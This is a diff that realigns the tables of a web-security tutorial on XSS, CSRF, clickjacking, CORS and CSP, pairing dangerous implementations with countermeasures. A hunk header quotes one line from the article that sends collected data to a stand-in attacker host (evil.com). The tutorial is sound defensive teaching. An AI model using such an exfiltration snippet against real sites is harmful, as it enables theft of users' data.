@@ -118,12 +118,12 @@ In other words, **CORS misconfiguration is a state where the "breakwater for pre
 
 ## Anti-patterns and Solutions
 
-| Vulnerability | ❌ Dangerous Implementation | ✅ Secure Countermeasure |
-| :--- | :--- | :--- |
-| **XSS** | Output user input as-is in HTML without escaping | Escape output appropriately, set CSP |
-| **CSRF** | Rely solely on Cookies for authentication | Use CSRF tokens, set SameSite attribute |
-| **Clickjacking** | Allow iframe embedding from external sites | Set `X-Frame-Options` or CSP `frame-ancestors` |
-| **CORS Misconfig** | Origin Reflection (returning the Origin header as-is) | Allow only specific origins from an allowlist |
+| Vulnerability      | ❌ Dangerous Implementation                           | ✅ Secure Countermeasure                       |
+| :---               | :---                                                  | :---                                           |
+| **XSS**            | Output user input as-is in HTML without escaping      | Escape output appropriately, set CSP           |
+| **CSRF**           | Rely solely on Cookies for authentication             | Use CSRF tokens, set SameSite attribute        |
+| **Clickjacking**   | Allow iframe embedding from external sites            | Set `X-Frame-Options` or CSP `frame-ancestors` |
+| **CORS Misconfig** | Origin Reflection (returning the Origin header as-is) | Allow only specific origins from an allowlist  |
 
 ---
 
@@ -482,12 +482,12 @@ new Image().src='https://evil.com/collect?d='+JSON.stringify(data)
 
 **Comparison: `Access-Control-Allow-Origin: *` vs `Origin Reflection`**
 
-| Feature | ACAO: * | Origin Reflection |
-| :--- | :--- | :--- |
-| **Allowed Target** | Everyone | Everyone (granted individually) |
-| **Credentials (Cookie)** | Not allowed | Allowed (Extremely Dangerous) |
-| **Primary Use Case** | Public APIs, static files | Debugging during development (Don't use in production!) |
-| **Security** | Relatively safe (public data only) | Vulnerability (source of data leaks) |
+| Feature                  | ACAO: *                            | Origin Reflection                                       |
+| :---                     | :---                               | :---                                                    |
+| **Allowed Target**       | Everyone                           | Everyone (granted individually)                         |
+| **Credentials (Cookie)** | Not allowed                        | Allowed (Extremely Dangerous)                           |
+| **Primary Use Case**     | Public APIs, static files          | Debugging during development (Don't use in production!) |
+| **Security**             | Relatively safe (public data only) | Vulnerability (source of data leaks)                    |
 
 ---
 
@@ -919,13 +919,13 @@ func corsMiddleware(next http.HandlerFunc) http.HandlerFunc {
 
 **Key CORS Headers:**
 
-| Header | Description | Vulnerability |
-| :--- | :--- | :--- |
-| `Access-Control-Allow-Origin` | Allowed origin | Use `*` cautiously |
-| `Access-Control-Allow-Credentials` | Allow sending credentials | Cannot be used with `*` |
-| `Access-Control-Allow-Methods` | Allowed HTTP methods | Only necessary ones |
-| `Access-Control-Allow-Headers` | Allowed request headers | Only necessary ones |
-| `Access-Control-Max-Age` | Cache duration for preflight | Set an appropriate value |
+| Header                             | Description                  | Vulnerability            |
+| :---                               | :---                         | :---                     |
+| `Access-Control-Allow-Origin`      | Allowed origin               | Use `*` cautiously       |
+| `Access-Control-Allow-Credentials` | Allow sending credentials    | Cannot be used with `*`  |
+| `Access-Control-Allow-Methods`     | Allowed HTTP methods         | Only necessary ones      |
+| `Access-Control-Allow-Headers`     | Allowed request headers      | Only necessary ones      |
+| `Access-Control-Max-Age`           | Cache duration for preflight | Set an appropriate value |
 
 **Preflight Requests (OPTIONS Method):**
 
@@ -973,12 +973,12 @@ fetch() from attacker site → Request can be sent
 
 **Fundamental Differences:**
 
-| | **CSRF** | **CORS** |
-| :--- | :--- | :--- |
-| **Primary Target** | **Request Submission** | **Response Reading** |
-| **Protection Target** | **Server-side** (preventing unintended operations) | **Client-side** (preventing data theft) |
-| **Attack Nature** | Impersonation to **perform actions** | Data **theft** from other sites |
-| **Browser's Role** | Auto-attaches Cookies (enables attacks) | Blocks response reading (provides defense) |
+|                       | **CSRF**                                           | **CORS**                                   |
+| :---                  | :---                                               | :---                                       |
+| **Primary Target**    | **Request Submission**                             | **Response Reading**                       |
+| **Protection Target** | **Server-side** (preventing unintended operations) | **Client-side** (preventing data theft)    |
+| **Attack Nature**     | Impersonation to **perform actions**               | Data **theft** from other sites            |
+| **Browser's Role**    | Auto-attaches Cookies (enables attacks)            | Blocks response reading (provides defense) |
 
 **CSRF Protection Purpose:** Verify "who sent the request"
 
@@ -1085,12 +1085,12 @@ Is sent **without preflight** → Bypasses CORS check
 
 **Attack Method Comparison:**
 
-| Attack Method | Preflight? | CORS Can Block? | CSRF Token Can Block? |
-| :--- | :---: | :---: | :---: |
-| **Form POST** | ❌ No | ❌ No | ✅ Yes |
-| **fetch + PUT/DELETE** | ✅ Yes | ✅ Yes | ✅ Yes |
-| **fetch + Custom Headers** | ✅ Yes | ✅ Yes | ✅ Yes |
-| **img tag GET** | ❌ No | ❌ No | ⚠️ Limited |
+| Attack Method              | Preflight? | CORS Can Block? | CSRF Token Can Block? |
+| :---                       | :---:      | :---:           | :---:                 |
+| **Form POST**              | ❌ No      | ❌ No           | ✅ Yes                |
+| **fetch + PUT/DELETE**     | ✅ Yes     | ✅ Yes          | ✅ Yes                |
+| **fetch + Custom Headers** | ✅ Yes     | ✅ Yes          | ✅ Yes                |
+| **img tag GET**            | ❌ No      | ❌ No           | ⚠️ Limited            |
 
 **Summary:**
 
@@ -1140,10 +1140,10 @@ func followHandler(w http.ResponseWriter, r *http.Request) {
 
 **Header Values and Effects:**
 
-| Value | Effect |
-| :--- | :--- |
-| `DENY` | Rejects all iframe embedding |
-| `SAMEORIGIN` | Allows embedding only from the same origin |
+| Value            | Effect                                     |
+| :---             | :---                                       |
+| `DENY`           | Rejects all iframe embedding               |
+| `SAMEORIGIN`     | Allows embedding only from the same origin |
 | `ALLOW-FROM uri` | Allows only a specific origin (Deprecated) |
 
 #### 2. Content-Security-Policy (CSP)
@@ -1208,32 +1208,32 @@ Browser: "Only execute scripts that come from the same origin ('self')."
 
 #### Common Directives
 
-| Directive | Controls | Example |
-| :--- | :--- | :--- |
-| `script-src` | Where JavaScript can be loaded from | `'self'`, `'unsafe-inline'`, `'nonce-abc'` |
-| `style-src` | Where CSS can be loaded from | `'self'`, `'unsafe-inline'` |
-| `img-src` | Where images can be loaded from | `'self'`, `https://images.example.com` |
-| `font-src` | Where fonts can be loaded from | `'self'`, `https://fonts.googleapis.com` |
-| `connect-src` | Destinations for fetch/XHR/WebSockets | `'self'`, `https://api.example.com` |
-| `frame-src` | Where iframes can be loaded from | `'self'`, `https://trusted.com` |
-| `frame-ancestors` | Which pages can embed this page | `'none'`, `'self'` (Clickjacking defense) |
-| `default-src` | Fallback for other directives | `'self'` |
-| `object-src` | Plugins like Flash/Java | `'none'` (Recommended) |
-| `base-uri` | Restricts `<base>` tags | `'self'` |
-| `form-action` | Where forms can be submitted | `'self'` |
+| Directive         | Controls                              | Example                                    |
+| :---              | :---                                  | :---                                       |
+| `script-src`      | Where JavaScript can be loaded from   | `'self'`, `'unsafe-inline'`, `'nonce-abc'` |
+| `style-src`       | Where CSS can be loaded from          | `'self'`, `'unsafe-inline'`                |
+| `img-src`         | Where images can be loaded from       | `'self'`, `https://images.example.com`     |
+| `font-src`        | Where fonts can be loaded from        | `'self'`, `https://fonts.googleapis.com`   |
+| `connect-src`     | Destinations for fetch/XHR/WebSockets | `'self'`, `https://api.example.com`        |
+| `frame-src`       | Where iframes can be loaded from      | `'self'`, `https://trusted.com`            |
+| `frame-ancestors` | Which pages can embed this page       | `'none'`, `'self'` (Clickjacking defense)  |
+| `default-src`     | Fallback for other directives         | `'self'`                                   |
+| `object-src`      | Plugins like Flash/Java               | `'none'` (Recommended)                     |
+| `base-uri`        | Restricts `<base>` tags               | `'self'`                                   |
+| `form-action`     | Where forms can be submitted          | `'self'`                                   |
 
 #### Source Values
 
-| Value | Meaning | Risk |
-| :--- | :--- | :--- |
-| `'self'` | Same origin only | Safe (Recommended) |
-| `'none'` | Allow nothing | Safest |
-| `'unsafe-inline'` | Allow inline scripts/styles | Dangerous (Negates XSS protection) |
-| `'unsafe-eval'` | Allow `eval()` etc. | Dangerous |
-| `'nonce-<value>'` | Only allow scripts with matching nonce attribute | Safe (Recommended) |
-| `'sha256-<hash>'` | Only allow scripts matching the hash | Safe |
-| `https://...` | Allow specific domain | Moderate |
-| `*` | Allow everything | Dangerous |
+| Value             | Meaning                                          | Risk                               |
+| :---              | :---                                             | :---                               |
+| `'self'`          | Same origin only                                 | Safe (Recommended)                 |
+| `'none'`          | Allow nothing                                    | Safest                             |
+| `'unsafe-inline'` | Allow inline scripts/styles                      | Dangerous (Negates XSS protection) |
+| `'unsafe-eval'`   | Allow `eval()` etc.                              | Dangerous                          |
+| `'nonce-<value>'` | Only allow scripts with matching nonce attribute | Safe (Recommended)                 |
+| `'sha256-<hash>'` | Only allow scripts matching the hash             | Safe                               |
+| `https://...`     | Allow specific domain                            | Moderate                           |
+| `*`               | Allow everything                                 | Dangerous                          |
 
 #### Step-by-Step CSP Implementation
 
@@ -1313,14 +1313,14 @@ Attacker injects: <script>alert('XSS')</script>
 
 #### What CSP Can and Cannot Prevent
 
-| Attack | Prevented by CSP? | Reason |
-| :--- | :--- | :--- |
-| Inline `<script>` XSS | Yes, with `script-src 'self'` | Inline scripts are blocked |
-| External malicious scripts | Yes, with `script-src 'self'` | Non-allowed domains are blocked |
-| `eval()`-based XSS | Yes, without `unsafe-eval` | `eval()` is blocked |
-| Clickjacking | Yes, with `frame-ancestors 'none'` | iframe embedding is blocked |
-| CSRF | No | CSRF uses form submissions, not scripts |
-| `<img onerror=...>` XSS | Yes, without `unsafe-inline` | Inline event handlers are blocked |
+| Attack                     | Prevented by CSP?                  | Reason                                  |
+| :---                       | :---                               | :---                                    |
+| Inline `<script>` XSS      | Yes, with `script-src 'self'`      | Inline scripts are blocked              |
+| External malicious scripts | Yes, with `script-src 'self'`      | Non-allowed domains are blocked         |
+| `eval()`-based XSS         | Yes, without `unsafe-eval`         | `eval()` is blocked                     |
+| Clickjacking               | Yes, with `frame-ancestors 'none'` | iframe embedding is blocked             |
+| CSRF                       | No                                 | CSRF uses form submissions, not scripts |
+| `<img onerror=...>` XSS    | Yes, without `unsafe-inline`       | Inline event handlers are blocked       |
 
 #### Implementation: Go CSP Middleware
 
@@ -1369,17 +1369,17 @@ Example report body:
 
 ## Defensive Countermeasures Checklist
 
-| Vulnerability | Item | Check |
-| :--- | :--- | :--- |
-| **XSS** | Is user input being escaped? | □ |
-| | Using automatic escaping (e.g., `html/template`)? | □ |
-| | Is the HttpOnly Cookie set? | □ |
-| | Is CSP configured to restrict inline scripts? | □ |
-| **CSRF** | Is the CSRF token implemented? | □ |
-| | Is the SameSite attribute set to Lax or Strict? | □ |
-| | Is re-authentication required for critical operations? | □ |
-| **Clickjacking** | Is the X-Frame-Options header set? | □ |
-| | Is CSP frame-ancestors configured? | □ |
+| Vulnerability    | Item                                                   | Check |
+| :---             | :---                                                   | :---  |
+| **XSS**          | Is user input being escaped?                           | □     |
+|                  | Using automatic escaping (e.g., `html/template`)?      | □     |
+|                  | Is the HttpOnly Cookie set?                            | □     |
+|                  | Is CSP configured to restrict inline scripts?          | □     |
+| **CSRF**         | Is the CSRF token implemented?                         | □     |
+|                  | Is the SameSite attribute set to Lax or Strict?        | □     |
+|                  | Is re-authentication required for critical operations? | □     |
+| **Clickjacking** | Is the X-Frame-Options header set?                     | □     |
+|                  | Is CSP frame-ancestors configured?                     | □     |
 
 ---
 
